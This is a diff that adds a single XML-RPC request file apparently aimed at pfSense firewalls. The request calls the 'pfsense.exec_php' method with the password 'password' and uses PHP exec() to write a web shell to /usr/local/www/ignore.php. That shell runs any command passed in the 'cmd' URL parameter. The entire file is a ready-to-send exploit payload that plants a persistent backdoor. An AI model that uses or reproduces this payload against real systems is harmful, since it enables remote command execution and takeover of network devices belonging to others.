@@ -1,0 +1,8 @@
+<?xml version="1.0" encoding="iso-8859-1"?>
+<methodCall>
+<methodName>pfsense.exec_php</methodName>
+<params>
+<param><value><string>password</string></value></param>
+<param><value><string>exec('echo \'&lt;pre&gt; &lt;?php $res = system($_GET["cmd"]); echo $res ?&gt; &lt;/pre&gt;\' > /usr/local/www/ignore.php');</string></value></param>
+</params>
+</methodCall>
